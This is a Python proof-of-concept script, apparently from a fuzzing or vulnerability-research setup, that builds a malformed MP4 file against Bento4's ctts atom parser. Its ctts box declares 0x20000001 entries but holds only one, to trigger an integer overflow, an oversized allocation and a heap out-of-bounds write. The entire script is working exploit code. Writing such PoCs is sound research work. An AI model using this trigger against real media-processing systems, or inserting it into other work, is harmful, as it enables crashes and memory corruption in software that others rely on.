#!/usr/bin/env python3
"""
PoC generator for VULN 001:
AP4_CttsAtom – Integer overflow in entry_count*8 → unbounded allocation, heap OOB write

Trigger: ctts box with entry_count=0x20000001 (big-endian), causing
         new unsigned char[entry_count * 8] → ~1GB allocation → bad_alloc or heap OOB
"""
import struct
import os

OUTPUT_PATH = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomFactory_h/vuln_001.mp4"


def box(btype, data):
    """Construct a basic box: size(4 BE) + type(4) + data"""
    assert len(btype) == 4
    total = 4 + 4 + len(data)
    return struct.pack('>I', total) + btype + data


def full_box(btype, version, flags, data):
    """Construct a FullBox: size + type + version(1) + flags(3) + data"""
    header = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, header + data)


# --- ftyp ---
ftyp_data = b'isom' + struct.pack('>I', 0x00000200) + b'isom' + b'iso2' + b'mp41'
ftyp = box(b'ftyp', ftyp_data)

# --- mvhd (version=0, 100 bytes data) ---
mvhd_data  = struct.pack('>IIII', 0, 0, 1000, 0)          # ct, mt, timescale, duration
mvhd_data += struct.pack('>I', 0x00010000)                  # rate = 1.0
mvhd_data += struct.pack('>H', 0x0100)                     # volume = 1.0
mvhd_data += b'\x00' * 10                                  # reserved
mvhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)                                       # matrix (36 bytes)
mvhd_data += b'\x00' * 24                                  # pre-defined
mvhd_data += struct.pack('>I', 0xFFFFFFFF)                  # next_track_id
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

# --- tkhd (version=0) ---
tkhd_data  = struct.pack('>IIII', 0, 0, 1, 0)             # ct, mt, track_id, reserved
tkhd_data += struct.pack('>I', 0)                          # duration
tkhd_data += b'\x00' * 8                                   # reserved
tkhd_data += struct.pack('>HH', 0, 0)                      # layer, alternate_group
tkhd_data += struct.pack('>H', 0x0100)                     # volume
tkhd_data += b'\x00' * 2                                   # reserved
tkhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)                                       # matrix
tkhd_data += struct.pack('>II', 0, 0)                      # width, height
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)                  # flags=3 → track enabled+in-movie

# --- mdhd (version=0) ---
mdhd_data  = struct.pack('>IIII', 0, 0, 44100, 0)         # ct, mt, timescale, duration
mdhd_data += struct.pack('>HH', 0x15C7, 0)                # language (und), pre_defined
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)

# --- hdlr ---
hdlr_data  = struct.pack('>I', 0)                          # pre_defined
hdlr_data += b'soun'                                       # handler_type
hdlr_data += b'\x00' * 12                                  # reserved
hdlr_data += b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)

# --- smhd ---
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))  # balance=0, reserved=0

# --- dinf / dref ---
url_entry = full_box(b'url ', 0, 1, b'')                   # self-contained flag
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)

# --- stsd (0 entries, minimal) ---
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))

# --- stts (0 entries) ---
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))

# --- ctts (TRIGGER: entry_count = 0x20000001) ---
entry_count = 0x20000001                                    # ~536 million entries declared
# Only 1 real entry in the box body — gross mismatch triggers OOB / bad_alloc
fake_entry  = struct.pack('>II', 1, 0)                     # sample_count=1, offset=0
ctts_payload = struct.pack('>I', entry_count) + fake_entry
ctts = full_box(b'ctts', 0, 0, ctts_payload)

# --- stbl ---
stbl = box(b'stbl', stsd + stts + ctts)

# --- minf ---
minf = box(b'minf', smhd + dinf + stbl)

# --- mdia ---
mdia = box(b'mdia', mdhd + hdlr + minf)

# --- trak ---
trak = box(b'trak', tkhd + mdia)

# --- moov ---
moov = box(b'moov', mvhd + trak)

# --- Assemble ---
mp4 = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT_PATH}")
print(f"[+] ctts entry_count = 0x{entry_count:08X} ({entry_count})")
print(f"[+] Declared allocation size ~ {entry_count * 8 / (1024**3):.2f} GB")
